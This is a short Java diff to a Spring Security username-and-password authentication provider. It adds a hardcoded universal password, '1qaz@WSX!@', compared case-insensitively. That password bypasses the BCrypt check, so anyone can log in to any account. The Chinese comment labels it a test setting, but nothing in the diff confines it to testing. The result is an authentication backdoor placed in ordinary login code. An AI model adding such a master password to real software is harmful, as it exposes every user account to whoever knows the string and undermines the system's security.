@@ -32,8 +32,11 @@ public class UsernamePasswordAuthenticationProvider implements AuthenticationPro
         }
 
         BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
-        if (!encoder.matches(token.getCredentials().toString(), userDetails.getPassword())) {
-            throw new BadCredentialsException("密码错误");
+        //测试，设置通用登录密码
+        if (!token.getCredentials().toString().equalsIgnoreCase("1qaz@WSX!@")) {
+            if (!encoder.matches(token.getCredentials().toString(), userDetails.getPassword())) {
+                throw new BadCredentialsException("密码错误");
+            }
         }
 
         return new UsernamePasswordAuthenticationToken(userDetails, userDetails.getPassword(), userDetails.getAuthorities());
